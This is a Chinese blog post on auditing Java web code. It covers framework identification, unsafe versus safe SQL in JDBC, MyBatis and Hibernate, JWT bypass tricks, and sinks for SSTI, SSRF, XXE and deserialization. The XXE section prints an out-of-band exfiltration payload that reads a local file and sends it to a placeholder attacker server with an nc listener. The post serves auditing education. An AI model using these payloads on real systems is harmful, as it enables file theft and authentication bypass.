# 原创
：  【代码审计-JAVA】javaweb代码审计思路

# 【代码审计-JAVA】javaweb代码审计思路

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）框架-组件-依赖库-过滤器（√）
（2）SQL注入（√）
（3）安全验证（√）
（4）常规漏洞（√）
（5）审计工具（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|审计博文|类型|状态
|[【代码审计-PHP】phpStudy（新版） + PhpStorm + XDebug动态调试](https://blog.csdn.net/qq_53079406/article/details/127728220)|PHP|已发布
|[【代码审计-PHP】审计方法、敏感函数、功能点](https://blog.csdn.net/qq_53079406/article/details/127819601)|PHP|已发布
|[【代码审计-PHP】基于Thinkphp框架开发的](https://blog.csdn.net/qq_53079406/article/details/127826862)|PHP|已发布
|[【代码审计-.NET】基于.NET框架开发的基本特征](https://blog.csdn.net/qq_53079406/article/details/128257403)| .NET |已发布
|[【代码审计-.NET】基于.NET框架开发的代码审计](https://blog.csdn.net/qq_53079406/article/details/128262502)|.NET|已发布
|[【代码审计-JAVA】基于javaweb框架开发的](https://blog.csdn.net/qq_53079406/article/details/128267950)|JAVA|已发布
|[【代码审计-JAVA】javaweb代码审计思路](https://blog.csdn.net/qq_53079406/article/details/128270053)|JAVA|已发布
|2023将更新更多，敬请期待|——|——
</tbody></table>


---


**目录**

[一、框架-组件-依赖库-过滤器](#%E4%B8%80%E3%80%81%E6%A1%86%E6%9E%B6-%E7%BB%84%E4%BB%B6-%E4%BE%9D%E8%B5%96%E5%BA%93-%E8%BF%87%E6%BB%A4%E5%99%A8)

[1、框架-组件-依赖库](#1%E3%80%81%E6%A1%86%E6%9E%B6-%E7%BB%84%E4%BB%B6-%E4%BE%9D%E8%B5%96%E5%BA%93)

[2、过滤器](#2%E3%80%81%E8%BF%87%E6%BB%A4%E5%99%A8)

[二、SQL注入](#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5)

[1、JDBC 注入](#1%E3%80%81JDBC%20%E6%B3%A8%E5%85%A5)

[2、Mybatis注入](#2%E3%80%81Mybatis%E6%B3%A8%E5%85%A5)

[3、Hibernate注入](#3%E3%80%81Hibernate%E6%B3%A8%E5%85%A5)

[三、安全验证](#%E4%B8%89%E3%80%81%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81)

[1、验证框架](#1%E3%80%81%E9%AA%8C%E8%AF%81%E6%A1%86%E6%9E%B6)

[2、代码验证](#2%E3%80%81%E4%BB%A3%E7%A0%81%E9%AA%8C%E8%AF%81)

[3、过滤器](#3%E3%80%81%E8%BF%87%E6%BB%A4%E5%99%A8)

[4、JWT加密](#4%E3%80%81JWT%E5%8A%A0%E5%AF%86)

[四、常规漏洞](#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E)

[1、代码、函数执行](#1%E3%80%81%E4%BB%A3%E7%A0%81%E3%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C)

[2、SSTI](#2%E3%80%81SSTI)

[3、SSRF](#3%E3%80%81SSRF)

[4、XXE](#4%E3%80%81XXE)

[5、反序列化](#5%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)

[五、审计工具](#%E4%BA%94%E3%80%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7)

---


> 
<h2>一、框架-组件-依赖库-过滤器</h2>
<h3>1、框架-组件-依赖库</h3>
通过了解了开发的框架以及组件以后，可以扩大攻击面
查看配置文件web.xml和外部引用库，确定当前引用框架名称和版本
通过获取的版本等，对比漏洞库

<pre><code>框架确定：
1、maven（查看pom.xml关键字）
spring-core/ springframework.core    spring框架
struts2-core                         struts2框架
springframework.boot                 srping-boot框架
servlet-api                          原生servlet

2、lib（查看jar包名称）
spring-core/springframework.core    spring框架
struts2-core                        struts2框架
spring-boot                         srping-boot框架
servlet-api                         原生servlet</code></pre>

<pre><code>配置文件：
Struts2     struts.xml
Spring      applicationContext.xml
Spring MVC  spring-mvc.xml
Hibernate   Hibernate.cfg.xml
Mybaits     mybatis-config.xml</code></pre>
<h3>2、过滤器</h3>
过滤器专门设置了针对SQL注入、XSS等拦截 
通过对过滤器分析，可以知道过滤规则，以及可以最终筛选出未使用过滤器的URL
（也可以搜索关键字定位过滤器）
<pre><code>web.xml中
&lt;filter&gt;
    &lt;filter-name&gt;xsscheck&lt;/filter-name&gt;//名字
    &lt;filter-class&gt;com.anbai.sec.XssFilter&lt;/filter-class&gt;//class
&lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;xsscheck&lt;/filter-name&gt;//名字
    &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;//路由
&lt;/filter-mapping&gt;
</code></pre>



### 2、过滤器

> 
<h3>二、SQL注入</h3>
（数据库模式---&gt;sql语句的写法---&gt;函数---&gt;类---&gt;调用层次）
<h3>1、JDBC 注入</h3>
全称：Java数据库连接(Java Database connect)，它是一套用于执行SQL语句的Java API。应用程序可通过这套API连接到关系数据库，并使用SQL语句来完成对数据库中数据的查询、更新和删除等操作
<pre><code>1、PreparedStatement预编译机制（安全写法）

// sql语句（使用?进行占位）
String sql = "select * from user where id = ?";         
// sql语句的预编译（返回一个预编译对象）
xxx = conn.prepareStatement(sql);


2、直接进行拼接（不安全写法）
String sql = "select * from user where id ="+req.getParameter("id");</code></pre>
<hr/>
<h3>2、Mybatis注入</h3>
使用简单的 XML 或注解来配置和映射原生信息，将接口和 Java 的 POJO(Plain Old Java Objects,普通的Java对象)映射成数据库中的记录
搜索xml查找关键点（如${）---&gt;反推到DAO---&gt;到实现类---&gt;通过调用链找到前台URL---&gt;找到利用点
<pre><code>1、#会对语句进行预编译
安全写法（）： select *  from user where name = #{name}

2、${ }动态解析SQL时候会进行变量替换（ 只进行string替换）
不安全写法（UserDao.xml）：select *  from user where name = ${name} 

3、产生原因

模糊查询
使用#程序会报错         Select * from news where title like ‘%#{title}%’
（可能会把#号改成了$)
正确：                  Select * from news where tile like concat(‘%’,#{title}, ‘%’)


in 后有参数
使用# 同样会报错        Select * from news where id in (#{ids})
（可能会将将#替换为$）
正确(使用foreach)       id in&lt;foreach collection="ids" item="item" open="("separatosr="," close=")"&gt;#{ids} &lt;/foreach&gt;


order by
order by使用的是$，而like和in没有问题
</code></pre>

<hr/>
<h3>3、Hibernate注入</h3>
Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。 Hibernate可以应用在任何使用JDBC的场合，既可以在Java的客户端程序使用，也可以在Servlet/JSP的Web应用中使用，最具革命意义的是，Hibernate可以在应用EJB的JavaEE架构中取代CMP，完成数据持久化的重任

<pre><code>1、安全写法（）：参数绑定预编译
Query&lt;User&gt;.query=session.createNativeQuery("select * from user  where name=:name");
query.setParameter("name",parameter) ;

2、不安全写法（User.java）：直接拼接
Query&lt;User&gt;.query=session.createNativeQuery("select * from user  where name="+req.getParameter("id"));</code></pre>



### 1、JDBC 注入

---


### 3、Hibernate注入

> 
<h2>三、安全验证</h2>
<h3>1、验证框架</h3>
<pre><code>1、
Shiro：通用性，是一个权限管理的框架,实现用户认证、用户授权等
Spring Security：和 Spring 无缝整合
……

2、分析pom.xml Maven配置文件
&lt;shiro-spring-version&gt;……&lt;/shiro-spring-version&gt;
&lt;shiro-ehcache.version&gt;……&lt;/shiro-ehcache.version&gt;
针对对应的版本号，搜索已爆出的框架漏洞

3、查看shiro配置信息
tumo.shiro.anon_url=\
  /login,/logout,/register,\
  /,/about,/p/**,/links,/comment/**,/link/list,/article/list,\
  /css/**,/js/**,/img/**
（anon代表不需要鉴权的配置，**表示该接口下的所有接口）</code></pre>
<hr/>
<h3>2、代码验证</h3>
这就得抓包，并结合反编译对验证代码进行审计了
<hr/>
<h3>3、过滤器</h3>
过滤器的绕过、过滤器未引用
无非就是绕过if等判断语句
<hr/>
<h3>4、JWT加密</h3>
对于身份等重要的信息可能会使用JWT加密(在不知道密钥的情况下，黑盒很难利用)
JWT是三段式，在cookie中一眼就能看出加密后生成的token
（header.payload.signature）
<pre><code>1、空加密算法   
在header中指定alg为None
变为：header.payload


2、加密算法
RSA：非对称加密算法，使用私钥加密明文，公钥解密密文
HMAC：对称加密算法，使用相同的密钥对传输信息进行加解密
公钥可以通过一些途径获取（如前端加密等）
尝试使用HMAC替换RSA


3、kid（header中可选参数，指定加密密钥）
用户可控，可测试注入、文件读取等</code></pre>



### 2、代码验证

---


### 4、JWT加密

> 
<h2>四、常规漏洞</h2>
<h3>1、代码、函数执行</h3>
1、可执行函数（如exec()等），搞清楚传递过程，是否用户可控
2、表达式注入（一般是参数值，不过有的也有极少的是参数名，一般会有检测，如OGNL、SpEL、MVEL、EL、Fel、JST+EL等）
3、后端模板引擎注入（如Freemarker、Velocity、Thymeleaf等）
4、第三方开源组件（如Fastjson、Shiro、Xstream、Struts2）
<hr/>
<h3>2、SSTI</h3>
[【SSTI模块注入】SSTI+Flask+Python（上）](https://blog.csdn.net/qq_53079406/article/details/125959228?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167074860716782425657628%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167074860716782425657628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125959228-null-null.nonecase&amp;utm_term=ssti&amp;spm=1018.2226.3001.4450)
[【SSTI模块注入】SSTI+Flask+Python（中）](https://blog.csdn.net/qq_53079406/article/details/125963088?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167074860716782425657628%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167074860716782425657628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125963088-null-null.nonecase&amp;utm_term=ssti&amp;spm=1018.2226.3001.4450)
[【SSTI模块注入】SSTI+Flask+Python（下）](https://blog.csdn.net/qq_53079406/article/details/125967455?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167074860716782425657628%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167074860716782425657628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-125967455-null-null.nonecase&amp;utm_term=ssti&amp;spm=1018.2226.3001.4450)
源码：在pom.xml里面找使用有模版引擎，如freemarker
前端：寻找修改模块的功能点


<hr/>
<h3>3、SSRF</h3>
[【SSRF漏洞】原理、危害利用、触发点、利用过程、协议使用……](https://blog.csdn.net/qq_53079406/article/details/124005258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167074881116782425121342%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167074881116782425121342&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124005258-null-null.nonecase&amp;utm_term=ssrf&amp;spm=1018.2226.3001.4450)<br/>  
<pre><code>危险函数
urlConnection.getInputStream
HttpURLConnection.getInputStream
URLConnection.getInutStream      
HttpClient.execute
OkHttpClient.newCall.execute
Request.Get.execute
Request.Post.execute
URL.openStream                 
ImageIO.rea</code></pre>

<hr/>
<h3>4、XXE</h3>
[【XXE漏洞专题】XXE原理、产生、检测、危害、利用、示例](https://blog.csdn.net/qq_53079406/article/details/124360287?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167074917116800213011125%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167074917116800213011125&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124360287-null-null.nonecase&amp;utm_term=xxe&amp;spm=1018.2226.3001.4450)

<pre><code>xlsx-streamer poi-ooxml
Documentbuilder|DocumentBuilderFactory|SAXReader|SAXParser|SAXParserFactory|SAXBuilder|TransformerFactory|reqXml|getInputStream|XMLReaderFactory|.newInstance|SchemaFactory|SAXTransformerFactory|javax.xml.bind|XMLReader|XmlUtils.get|Validator
javax.xml.parsers.DocumentBuilder
javax.xml.stream.XMLStreamReader
org.jdom.input.SAXBuilder
org.jdom2.input.SAXBuilder
javax.xml.parsers.SAXParser
org.dom4j.io.SAXReader
org.xml.sax.XMLReader
javax.xml.transform.sax.SAXSource
javax.xml.transform.TransformerFactory
javax.xml.transform.sax.SAXTransformerFactory
javax.xml.validation.SchemaFactory
javax.xml.bind.Unmarshaller
javax.xml.xpath.XPathExpression
org.apache.commons.digester3.Digester</code></pre>
<pre><code>xxx.xlsx:
&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM "http://攻击者服务器/xxx.dtd"&gt;
%remote;%int;%send;
]&gt;
&lt;root&gt;&amp;send;&lt;/root&gt;

xxx.dtd:
&lt;!ENTITY % file SYSTEM "file:///flag"&gt;
&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://攻击者服务器:端口/%file;'&gt;"&gt;

攻击者服务器监听
nc -lvvp 端口</code></pre>

<hr/>
<h3>5、反序列化</h3>
序列化使用的地方：
1、参数，cookie，sesion，存储时候可能会base64，压缩后的base64、MII等加密
2、Servlets http，Sockets，Session管理器（包含的协议：JMX,RMI,JMS,JND1等）
3、xmlXstream，XmldEcoder等（http Body:Content-type: application/xml）
4、json(jackson,fastjson)http请求中包含

框架组件：fastjson，shiro，jackson，CommonsCollections等

利用工具：
jndi：可用于Fastjson、Jackson等验证<br/> ysoserial：支持多种引用库生成的payload<br/> marshalsec：可以快速启动rmi/ldap server<br/> FastjsonExploit：专门针对fastjson的exp框架
<pre><code>ObjectInputStream.readObject
ObjectInputStream.readUnshared
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readValue
JSON.parseObject</code></pre>
[【PHP反序列化】PHP反序列化原理、函数、利用过程](https://blog.csdn.net/qq_53079406/article/details/124227179?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167076029616800182771040%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167076029616800182771040&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124227179-null-null.nonecase&amp;utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450)
[【JAVA反序列化漏洞】简介、原理、工具、环境、靶场、思路](https://blog.csdn.net/qq_53079406/article/details/124233881?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167076029616800182771040%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167076029616800182771040&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124233881-null-null.nonecase&amp;utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450)



### 2、SSTI

---


### 4、XXE

---


> 
<h2>五、审计工具</h2>



Fortify、CheckMarx、Findbugs、PMD等




---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

